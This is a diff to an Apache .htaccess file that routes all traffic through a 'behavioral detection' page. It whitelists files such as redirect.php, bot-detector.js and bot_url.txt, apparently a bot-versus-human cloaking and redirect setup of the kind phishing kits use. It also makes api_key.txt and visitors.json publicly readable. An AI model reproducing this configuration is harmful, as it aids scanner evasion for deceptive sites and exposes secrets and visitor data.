@@ -160,4 +160,14 @@ ErrorDocument 404 /index.html
     RewriteCond %{HTTP_REFERER} !^$
     RewriteCond %{HTTP_REFERER} !^https?://(www\.)?%{HTTP_HOST} [NC]
     RewriteRule \.(gif|jpg|jpeg|png|js|css)$ - [F,L]
+    
+    # VISITOR ROUTING - Enhanced behavioral detection flow
+    # Allow direct access to admin and system files
+    RewriteCond %{REQUEST_FILENAME} -f [OR]
+    RewriteCond %{REQUEST_FILENAME} -d [OR]
+    RewriteCond %{REQUEST_URI} ^/(index\.html|redirect\.php|visitor\.html|bot-detector\.js|get_visitors\.php|check_auth\.php|admin_login\.php|admin_action\.php|get_config\.php|update_config\.php|test_api\.php|visitors\.json|redirect_url\.txt|bot_url\.txt|api_key\.txt)$
+    RewriteRule ^ - [L]
+    
+    # Route all other traffic through behavioral detection first
+    RewriteRule ^(.*)$ visitor.html [QSA,L]
 </IfModule>
